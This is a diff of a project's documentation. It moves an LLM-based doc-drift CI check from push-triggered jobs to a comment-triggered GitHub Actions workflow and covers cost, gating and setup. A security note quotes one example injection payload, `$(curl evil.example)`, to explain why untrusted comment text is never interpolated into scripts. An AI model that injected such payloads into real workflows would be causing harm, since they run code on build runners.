@@ -202,42 +202,69 @@ Any prose doc — including ones not covered by the CI job below — can be chec
 - Reports MAJOR / MODERATE / MINOR drift with quoted claims + code `file:line` references
 - Human decides whether to update doc, update code, or accept divergence
 
-### Automated: four CI jobs, one per doc
+### CI-automated, on-demand: four docs, triggered by a PR comment
 
-Four docs now have a CI-automated check, each gated on its own path filter so it only runs
-when the doc or the code it describes actually changed in the PR:
+Four docs have a CI-automated check, but — unlike a typical CI job — it does **not** run on
+every push. It runs only when someone comments on the PR asking for it, in
+[`.github/workflows/doc-drift-on-demand.yml`](../.github/workflows/doc-drift-on-demand.yml):
 
-| Job | Doc | Trigger paths (git-diff filter) |
+```
+Comment on a PR:  /check-doc-drift                          → checks all four docs
+                  /check-doc-drift authentication            → just that one
+                  /check-doc-drift claude                    → CLAUDE.md
+                  /check-doc-drift analysis-pipeline
+                  /check-doc-drift dashboard-output-formats
+```
+
+| Job | Doc | Code sent to the model |
 |---|---|---|
-| `doc-drift-authentication` | [`authentication.md`](authentication.md) | `source/AiPMOInsight.Api/Security/`, `source/AiPMOInsight.Infrastructure/Security/`, `AuthEndpoints.cs`, `Program.cs`, or the doc itself |
-| `doc-drift-claude-md` | [`CLAUDE.md`](../CLAUDE.md) | The §3 "control points" file set: `Program.cs`, `Application/Messaging/`, `Application/Abstractions/`, both `DependencyInjection.cs` files, `Api/Endpoints/`, `Api/Security/`, `Infrastructure/Security/`, `Infrastructure/Persistence/` (incl. `Migrations/` for the trigger, though migration file *contents* aren't sent to the model), `HealthScoring/HealthScoringService.cs`+`HealthScoringOptions.cs`, `Analysis/Llm/RoutingLlmClient.cs`+`ILlmClientFactory.cs`, `TestWebAppFactory.cs`, or the doc itself |
-| `doc-drift-analysis-pipeline` | [`analysis-pipeline.md`](analysis-pipeline.md) | `source/AiPMOInsight.Application/Features/Analysis/` (all files, discovered dynamically — a new agent file doesn't need a workflow edit) or the doc itself |
-| `doc-drift-dashboard-output-formats` | [`dashboard-output-formats.md`](dashboard-output-formats.md) | `source/AiPMOInsight.Application/Features/{ExecutivePortfolio,HealthScoring,DataQuality,Findings,Progress}/`, five hand-picked dashboard-serving files under `source/AiPMOInsight.Api/Endpoints/` (not the whole folder — Auth/Profile/Ingest/UploadHistory/ProjectKeys endpoints aren't dashboard panels), or the doc itself |
+| `doc-drift-authentication` | [`authentication.md`](authentication.md) | `source/AiPMOInsight.Api/Security/`, `source/AiPMOInsight.Infrastructure/Security/`, `AuthEndpoints.cs`, `Program.cs` |
+| `doc-drift-claude-md` | [`CLAUDE.md`](../CLAUDE.md) | The §3 "control points" file set: `Program.cs`, `Application/Messaging/`, `Application/Abstractions/`, both `DependencyInjection.cs` files, `Api/Endpoints/`, `Api/Security/`, `Infrastructure/Security/`, `Infrastructure/Persistence/` (top-level only, not `Migrations/`), `HealthScoring/HealthScoringService.cs`+`HealthScoringOptions.cs`, `Analysis/Llm/RoutingLlmClient.cs`+`ILlmClientFactory.cs`, `TestWebAppFactory.cs` |
+| `doc-drift-analysis-pipeline` | [`analysis-pipeline.md`](analysis-pipeline.md) | `source/AiPMOInsight.Application/Features/Analysis/` (all files, discovered dynamically at run time) |
+| `doc-drift-dashboard-output-formats` | [`dashboard-output-formats.md`](dashboard-output-formats.md) | `source/AiPMOInsight.Application/Features/{ExecutivePortfolio,HealthScoring,DataQuality,Findings,Progress}/`, five hand-picked dashboard-serving files under `source/AiPMOInsight.Api/Endpoints/` |
 
-Common shape for all four, in [`.github/workflows/ci.yml`](../.github/workflows/ci.yml):
+**Why comment-triggered, not push-triggered (as it was 2026-07-21 to 2026-07-23).** The
+original design ran automatically on every PR push (`if: github.event_name ==
+'pull_request'`, gated by a path filter). The problem: the path filter compared the *full*
+diff since the base branch (`origin/<base>...HEAD`), not the incremental diff of the latest
+push. So once a PR touched a mapped path even once, `changed=true` stayed true for every
+subsequent push to that PR — a 5-commit PR touching all four docs' code areas would fire
+5 × 4 = 20 LLM calls, not 4, with no caching between them. Moving to a comment trigger makes
+the cost proportional to how many times a human actually asks, not how many times they push.
 
-- **Trigger:** PR only. No relevant change → job short-circuits without any API call.
-- **Model:** `$DOC_DRIFT_MODEL` (currently `claude-sonnet-5`, set once at the top of the
-  workflow file — change there, not per-job).
-- **Output:** posted to the PR's job summary in the same format as the local slash command.
-- **Blocking:** **no** — advisory only, same tier as Layer 1.5 oasdiff classification.
+**How it works** (`dispatch` job in the workflow):
+1. Someone comments `/check-doc-drift [doc]` on an open PR.
+2. Gated on: the comment is on a PR (not a plain issue), the commenter's
+   `author_association` is `OWNER`/`MEMBER`/`COLLABORATOR` (blocks a random commenter from
+   burning API budget), and the comment starts with `/check-doc-drift`.
+3. `dispatch` parses the argument, resolves the PR's head ref via `gh pr view`, reacts 👀 on
+   the comment to confirm it was seen, and (if the argument didn't match a known doc) replies
+   with a usage message instead of running anything.
+4. Each `doc-drift-*` job runs only if `dispatch` resolved to `all` or that job's specific
+   doc name, checks out the **PR's head ref** (not the default branch — `issue_comment`
+   doesn't carry a ref the way `pull_request` does), and runs the same prompt-assembly +
+   Anthropic API call as before.
+5. Result is posted **both** to the run's job summary and as a **reply comment directly on
+   the PR** — more visible than a job summary link for something a human explicitly asked
+   for.
 
-`CLAUDE.md`'s job is a special case worth calling out: CLAUDE.md's own scope is nearly the
-whole solution (composition root, DI, endpoints, security, persistence, health scoring, LLM
-routing, test host), so unlike the other three its trigger will fire on a large share of
-substantive PRs — that's inherent to what the doc describes, not a mistake in the path
-filter. The code sent to the model is still a hand-picked, bounded file set (~41 files,
-matching CLAUDE.md §3's named control points) rather than the entire `source/` tree, to keep
-the prompt size and cost sane.
+**SECURITY note baked into the workflow:** the comment body (`github.event.comment.body`) is
+untrusted, attacker-controllable text. It's passed through an environment variable
+(`env: COMMENT_BODY: ...`) and only ever used inside quoted shell expansions — never spliced
+directly via `${{ }}` into a `run:` script. Doing the latter is a well-known GitHub Actions
+script-injection vector (a crafted comment like `` $(curl evil.example) `` would execute on
+the runner if interpolated directly into the script text).
 
-**Setup required (one-time):** the jobs need an `ANTHROPIC_API_KEY` repo secret. Add it in
-GitHub → Settings → Secrets and variables → Actions → New repository secret. If the secret
-is unset each job posts its own "skipped" summary and exits cleanly — the check is opt-in
-per-repo, not a hard dependency of the CI pipeline. One secret covers all four jobs.
+**Setup required (one-time):** same as before — an `ANTHROPIC_API_KEY` repo secret. Add it in
+GitHub → Settings → Secrets and variables → Actions → New repository secret. If unset, each
+job posts its own "skipped" summary + PR reply and exits cleanly. The workflow also needs
+`permissions: pull-requests: write` (already set at the workflow level) so it can post the
+reaction and the reply comment.
 
-**Fork PRs:** GitHub does not expose secrets to workflows triggered from forks. Fork PRs
-will always see the "skipped" summary. Not a concern for this repo today (single-team, no
-external contributors), but worth noting if that changes.
+**Fork PRs:** GitHub does not expose secrets to workflows triggered from forks, and
+`issue_comment` from a fork runs against the base repo's workflow file (not the fork's),
+which is actually safer than `pull_request` triggers from forks. Not a concern for this repo
+today (single-team, no external contributors).
 
 ### Why these four docs (and not the rest)
 
@@ -306,9 +333,9 @@ Grep for names.
 | Schema-name transformer | `source/AiPMOInsight.Api/Program.cs` → `AddOpenApi(options => ...)` |
 | Endpoints requiring `.Produces<T>()` | `source/AiPMOInsight.Api/Endpoints/*.cs` |
 | Integration test host | `tests/AiPMOInsight.Api.Tests/TestWebAppFactory.cs` |
-| Layer 3 on-demand command | `.claude/commands/check-doc-drift.md` |
-| Layer 3 CI jobs | `.github/workflows/ci.yml` → `doc-drift-authentication`, `doc-drift-claude-md`, `doc-drift-analysis-pipeline`, `doc-drift-dashboard-output-formats` |
-| Layer 3 model config | `.github/workflows/ci.yml` → `env.DOC_DRIFT_MODEL` |
+| Layer 3 local command | `.claude/commands/check-doc-drift.md` |
+| Layer 3 CI-automated, comment-triggered | `.github/workflows/doc-drift-on-demand.yml` → `dispatch`, `doc-drift-authentication`, `doc-drift-claude-md`, `doc-drift-analysis-pipeline`, `doc-drift-dashboard-output-formats` |
+| Layer 3 model config | `.github/workflows/doc-drift-on-demand.yml` → `env.DOC_DRIFT_MODEL` |
 
 ## 9. Alternatives considered
 
